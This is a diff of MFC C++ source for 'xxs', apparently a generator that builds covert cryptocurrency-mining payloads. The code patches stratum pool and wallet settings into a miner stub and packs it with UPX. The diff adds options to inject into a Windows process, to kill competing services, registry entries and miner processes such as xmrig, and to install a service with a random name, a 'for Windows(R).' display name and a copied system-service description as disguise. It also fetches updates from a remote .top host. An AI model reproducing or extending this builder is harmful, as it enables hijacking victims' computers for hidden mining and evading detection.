@@ -3,7 +3,7 @@
 #include "stdafx.h"
 #include "xxs.h"
 #include "xxsDlg.h"
-
+#define MAX_LENGTH 256
 #include "STRING.H"
 #include <stdio.h>     
 #include <afxinet.h> 
@@ -19,7 +19,7 @@ static char THIS_FILE[] = __FILE__;
 
 	CString UpdateDate = "http://km.xn--pssa2683b.top/riqi.txt";  //挖矿程序更新日期
 
-	CString CurrentVersion = "2.3.1";//目前生成器版本
+	CString CurrentVersion = "2.4";//目前生成器版本
 	
 	CString downloadLink = "http://km.xn--pssa2683b.top/scq.exe";//生成器下载地址
 	
@@ -35,8 +35,7 @@ CMyDlg::CMyDlg(CWnd* pParent /*=NULL*/)
 {
 	//{{AFX_DATA_INIT(CMyDlg)
 
-	m_serdis = _T(" -B -o stratum+tcp://矿池地址 -u 钱包地址 -p x -k ");
-	filename = _T("thisxxs");
+
 
 	//}}AFX_DATA_INIT
 	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
@@ -51,13 +50,20 @@ void CMyDlg::DoDataExchange(CDataExchange* pDX)
 	DDX_Check(pDX, IDC_UPX, UPX);
 	DDX_Text(pDX, IDC_SET_DIS, m_serdis);
 	DDX_Text(pDX, IDC_SET_DIS2, filename);
+	DDX_Text(pDX, IDC_EDIT6, wininj);
+	DDX_Text(pDX, IDC_EDIT7, service);
+	DDX_Text(pDX, IDC_EDIT8, Registry);
+	DDX_Text(pDX, IDC_EDIT9, winProcess);
+	DDX_Text(pDX, IDC_EDIT10, linuxProcess);
+	DDX_Text(pDX, IDC_EDIT_SVCNAME, m_svcname);
+	DDX_Text(pDX, IDC_EDIT_SHELP, m_shelp);
+	DDX_Text(pDX, IDC_EDIT_SCNAME, m_scname);
 	//}}AFX_DATA_MAP
 }
 
 BEGIN_MESSAGE_MAP(CMyDlg, CDialog)
 	//{{AFX_MSG_MAP(CMyDlg)
 	ON_WM_PAINT()
-	ON_WM_QUERYDRAGICON()
 	ON_BN_CLICKED(IDC_xxs, Onxxs)
 	ON_EN_CHANGE(IDC_EDIT3, OnChangeEdit3)
 	ON_BN_CLICKED(IDC_BUTTON1, OnButton1)
@@ -65,10 +71,12 @@ BEGIN_MESSAGE_MAP(CMyDlg, CDialog)
 	ON_EN_CHANGE(IDC_SET_DIS, OnChangeSetDis)
 	ON_BN_CLICKED(IDOK3, OnOk3)
 	ON_EN_CHANGE(IDC_SET_DIS2, OnChangeSetDis2)
-	ON_BN_CLICKED(IDOK4, OnOk4)
-	ON_BN_CLICKED(IDOK5, OnOk5)
 	ON_BN_CLICKED(IDC_BUTTON2, OnButton2)
 	ON_BN_CLICKED(IDC_BUTTON3, OnButton3)
+	ON_WM_QUERYDRAGICON()
+	ON_BN_CLICKED(IDC_HELP, OnHelp)
+	ON_BN_CLICKED(IDCANCEL2, OnCancel2)
+	ON_BN_CLICKED(IDC_RANDOM, OnRandom)
 	//}}AFX_MSG_MAP
 END_MESSAGE_MAP()
 
@@ -81,6 +89,7 @@ BOOL CMyDlg::OnInitDialog()
 
 	// Set the icon for this dialog.  The framework does this automatically
 	//  when the application's main window is not a dialog
+	OnCancel2();
 	SetIcon(m_hIcon, TRUE);			// Set big icon
 	SetIcon(m_hIcon, FALSE);		// Set small icon
 	
@@ -92,7 +101,12 @@ BOOL CMyDlg::OnInitDialog()
 // If you add a minimize button to your dialog, you will need the code below
 //  to draw the icon.  For MFC applications using the document/view model,
 //  this is automatically done for you by the framework.
-
+CString GetString(CString AppName,CString KeyName)
+{
+	TCHAR buf[MAX_LENGTH];
+	::GetPrivateProfileString(AppName, KeyName, NULL, buf, sizeof(buf), ".\\xxs.ini");
+	return buf;
+}
 // 判断文件是否存在
 BOOL IsFileExist(const CString& csFile)
 {
@@ -103,7 +117,7 @@ BOOL IsFileExist(const CString& csFile)
 CString DownloadContent(CString url)//获取网页内容
 {
 	CString PageData;
-	if (IsFileExist("C:\\thisxxs")!=TRUE)//判断文件是否存在
+	if (strcmp(GetString(_T("xxs"),_T("lx")),"yes"))//判断ini
 	{
 		CInternetSession Session(NULL,0);
 		CString TempData;
@@ -138,6 +152,7 @@ void update()
 
 void CMyDlg::OnPaint() 
 {
+
 	if (IsIconic())
 	{
 		CPaintDC dc(this); // device context for painting
@@ -149,7 +164,7 @@ void CMyDlg::OnPaint()
 		int cyIcon = GetSystemMetrics(SM_CYICON);
 		CRect rect;
 		GetClientRect(&rect);
-		int x = (rect.Width() - cxIcon + 1) / 2;
+		int x = (rect.Width() - cxIcon + 1 ) / 2;
 		int y = (rect.Height() - cyIcon + 1) / 2;
 
 		// Draw the icon
@@ -161,7 +176,6 @@ void CMyDlg::OnPaint()
 	}
 
     //公告地址
-   		
 	SetDlgItemText(IDC_EDIT2,DownloadContent(Noticeurl));//公告
 	Sleep(50);
 	SetDlgItemText(IDC_EDIT3,CurrentVersion);//当前生成器版本
@@ -170,6 +184,36 @@ void CMyDlg::OnPaint()
 	Sleep(50);
 	SetDlgItemText(IDC_EDIT5,DownloadContent(UpdateDate));//挖矿程序更
 	Sleep(50);
+	if (IsFileExist("xxs.ini")==false)//判断文件是否存在
+	{
+		SetDlgItemText(IDC_SET_DIS," -B -o stratum+tcp://矿池地址 -u 钱包地址 -p x -k ");
+		SetDlgItemText(IDC_SET_DIS2,"this");
+		SetDlgItemText(IDC_EDIT6,"0");//注入进程
+		SetDlgItemText(IDC_EDIT7,"0");//k服务
+		SetDlgItemText(IDC_EDIT8,"0");//k注册表
+		SetDlgItemText(IDC_EDIT9,"0");//k进程
+		SetDlgItemText(IDC_EDIT10,"xmrig:mine");//klinux进程
+		char chSvcName[128]={0},chSvcnName[128]={0},chHelpName[128]={0};
+		wsprintf(chSvcName,"%c%c%c",'a'+rand()%25,'a'+rand()%25,'a'+rand()%25);
+		wsprintf(chSvcnName,"%c%c%c for Windows(R).",'a'+rand()%25,'a'+rand()%25,'a'+rand()%25);
+		wsprintf(chHelpName,"管理基于组件对象模型的核心服务。如果服务被禁用，计算机将无法正常运行。");
+		SetDlgItemText(IDC_EDIT_SVCNAME, chSvcName);
+		SetDlgItemText(IDC_EDIT_SCNAME, chSvcnName);
+		SetDlgItemText(IDC_EDIT_SHELP, chHelpName);
+	}
+	else
+	{
+		SetDlgItemText(IDC_SET_DIS,GetString(_T("xxs"),_T("wallet")));
+		SetDlgItemText(IDC_SET_DIS2,GetString(_T("xxs"),_T("filename")));
+		SetDlgItemText(IDC_EDIT6,"0");//注入进程
+		SetDlgItemText(IDC_EDIT7,GetString(_T("xxs"),_T("service")));//k服务
+		SetDlgItemText(IDC_EDIT8,GetString(_T("xxs"),_T("service")));//k注册表
+		SetDlgItemText(IDC_EDIT9,GetString(_T("xxs"),_T("winProcess")));//k进程
+		SetDlgItemText(IDC_EDIT10,GetString(_T("xxs"),_T("linuxProcess")));//klinux进程
+		SetDlgItemText(IDC_EDIT_SVCNAME, GetString(_T("xxs"),_T("SerName")));
+		SetDlgItemText(IDC_EDIT_SCNAME, GetString(_T("xxs"),_T("Serdisplay")));
+		SetDlgItemText(IDC_EDIT_SHELP, GetString(_T("xxs"),_T("Serdesc")));
+	}
 	//	UpdateWindow();
 }
 
@@ -186,30 +230,53 @@ HCURSOR CMyDlg::OnQueryDragIcon()
  struct FALLEN_DATA
 {
 	unsigned int finder;
-
-	char xxs[1000];
-	char filename[1000];
-
+	char xxs[1000];			//运行命令
+	char filename[255];		//释放的文件名
+	char service[255];		//k的服务名
+	char Registry[255];		//k的注册表名
+	char winProcess[255];	//k的win进程名
+	char linuxProcess[255]; //k的linux进程名
+	char wininj[100];		//注入的win进程
+	char SerName[100];		//服务名称
+	char Serdisplay[128];	//显示名称
+	char Serdesc[256];		//服务描述
 }
 fallen_data =
 {
 	0xF9E28F8D,
 	"xxs",
-	"filename"
-
-
+	"filename",
+	"123:456",
+	"123",
+	"abc.exe",
+	"abc",
+	"wps.exe",
+	"fuwmc",
+	"xiansmc",
+	"fuwumiaosu"
 };
 
-//美观哈哈哈..........................................................................
+//放到一起
 void CMyDlg::build(CString file)
 {
 	UpdateData(TRUE);
 	//	DeleteFile("xxskm");
 	CString file2 ="\\\\";
 	char *file1 =(LPSTR)(LPCTSTR)file2;
+
 	strcat(file1,file);
+	m_serdis.Replace("-B", " -B");//ini读取时，会漏掉空格.
 	strcpy(fallen_data.xxs,m_serdis.GetBuffer(0));
 	strcpy(fallen_data.filename,filename.GetBuffer(0));//挖矿文件名
+	strcpy(fallen_data.service,service.GetBuffer(0));//要k的服务
+	strcpy(fallen_data.Registry,Registry.GetBuffer(0));//要k的注册表
+	strcpy(fallen_data.winProcess,winProcess.GetBuffer(0));//要k的Windows进程
+	strcpy(fallen_data.linuxProcess,linuxProcess.GetBuffer(0));//要k的linux进程
+	strcpy(fallen_data.wininj,wininj.GetBuffer(0));//要注入的win进程
+	strcpy(fallen_data.SerName, m_svcname.GetBuffer(0));
+	strcpy(fallen_data.Serdisplay, m_scname.GetBuffer(0));
+	strcpy(fallen_data.Serdesc, m_shelp.GetBuffer(0));
+
 	char Path[MAX_PATH];
 	GetCurrentDirectory(MAX_PATH,Path);
 	strcat(Path,file1);
@@ -259,7 +326,17 @@ void CMyDlg::build(CString file)
 	{
 		ShellExecuteA(NULL, "open", "upx.exe",filetmp, NULL, NULL);//upx压缩
 		MessageBox("upx压缩成功","提示");
-	} 
+	}
+	//保存ini配置
+	WritePrivateProfileString(_T("xxs"),_T("wallet"),m_serdis,_T(".\\xxs.ini"));
+	WritePrivateProfileString(_T("xxs"),_T("filename"),filename,_T(".\\xxs.ini"));
+	WritePrivateProfileString(_T("xxs"),_T("service"),service,_T(".\\xxs.ini"));
+	WritePrivateProfileString(_T("xxs"),_T("Registry"),Registry,_T(".\\xxs.ini"));
+	WritePrivateProfileString(_T("xxs"),_T("winProcess"),winProcess,_T(".\\xxs.ini"));
+	WritePrivateProfileString(_T("xxs"),_T("linuxProcess"),linuxProcess,_T(".\\xxs.ini"));
+	WritePrivateProfileString(_T("xxs"),_T("SerName"),m_svcname,_T(".\\xxs.ini"));
+	WritePrivateProfileString(_T("xxs"),_T("Serdisplay"),m_scname,_T(".\\xxs.ini"));
+	WritePrivateProfileString(_T("xxs"),_T("Serdesc"),m_shelp,_T(".\\xxs.ini"));
 
 }
 
@@ -465,26 +542,53 @@ void CMyDlg::OnOk4()
 	build("jtxxs");
 }
 
-void CMyDlg::OnOk5() 
-{	UpdateData(TRUE);
-	//minearm
-	// TODO: Add your control notification handler code here
-	build("armxxs2");
-}
-
 void CMyDlg::OnButton2() 
 {
 	// TODO: Add your control notification handler code here
-	HANDLE hFile;
-	hFile = CreateFile("C:\\thisxxs",NULL,NULL,NULL,CREATE_ALWAYS,NULL,NULL);//空的
-	CloseHandle(hFile);
+	WritePrivateProfileString(_T("xxs"),_T("lx"),"yes",_T(".\\xxs.ini"));
 	MessageBox("重启生效","提示"); 
 }
 
 void CMyDlg::OnButton3() 
 {
-	DeleteFile("C:\\thisxxs");
+	WritePrivateProfileString(_T("xxs"),_T("lx"),"no",_T(".\\xxs.ini"));
 	MessageBox("重启生效","提示"); 
+	// TODO: Add your control notification handler code here
+	
+}
+
+void CMyDlg::OnButton4() 
+{
+	// TODO: Add your control notification handler code here
+
+	
+}
+
+void CMyDlg::OnHelp() 
+{
+	// TODO: Add your control notification handler code here
+	MessageBox("linux(官方)：2.6.4内核，兼容性不错（基本全系统兼容）.\nlinux（兼容）：全系统兼容，内核版本2.6.0bate3. \narm（1）2.6.4最新内核,arm暂停使用.","提示"); 
+}
+
+void CMyDlg::OnCancel2() 
+{
+	// TODO: Add your control notification handler code here
+	static BOOL bShow = TRUE;
+	RECT rct;
+	GetWindowRect(&rct);
+	bShow = !bShow;
+	
+	if	(bShow)
+		rct.right = rct.right + 300;
+	else
+		rct.right = rct.right - 300;
+	MoveWindow(&rct, TRUE);
+	InvalidateRect(NULL);
+	UpdateWindow();
+}
+
+void CMyDlg::OnRandom() 
+{
 	// TODO: Add your control notification handler code here
 	
 }
